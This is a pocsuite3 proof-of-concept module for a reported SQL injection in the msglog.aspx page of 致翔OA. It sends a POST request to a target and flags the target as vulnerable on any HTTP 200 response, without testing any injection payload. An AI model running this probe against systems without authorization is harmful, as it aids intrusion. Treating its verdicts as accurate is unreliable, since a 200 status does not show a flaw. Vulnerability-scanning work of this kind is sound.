from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 关于类的继承
class ZXPOC(POCBase):
    vulID = "0"  # ssvid ID
    version = "1"  # 默认为1
    author = "xans"  # PoC作者的大名
    vulDate = "2022-10-17"  # 漏洞公开的时间
    createDate = "2022-10-17"  # 编写 PoC 的日期
    updateDate = "2022-10-17"  # PoC 更新的时间
    references = ["http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%20msglog.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"]  # 漏洞地址来源
    name = "致翔OA SQL注入漏洞 PoC"  # PoC 名称
    appPowerLink = "http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E7%BF%94OA/%E8%87%B4%E7%BF%94OA%20msglog.aspx%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"  # 漏洞厂商主页地址
    appName = "致翔OA"  # 漏洞应用名称
    appVersion = "致翔OA"  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列
    # install_requires = []  # PoC 第三方模块依赖
    desc = """致翔OA msglog.aspx文件存在SQL注入漏洞，攻击者通过漏洞可获取敏感信息"""  # 漏洞简要描述
    pocDesc = """"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码


        headers = {"Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        result = []

        try:
            full_url = f"{self.url}/mainpage/msglog.aspx?user=1"
            res = requests.post(full_url, headers=headers, verify=False, timeout=9,allow_redirects=False)
            # 判断是否存在漏洞
            if res.status_code == 200:
                result.append(self.url)
        except Exception as e:
            print(e)

        finally:
            return result

    def _verify(self):

        result = {}
        res = self._check()
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):

        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass

def other_utils_func():
    pass


register_poc(ZXPOC)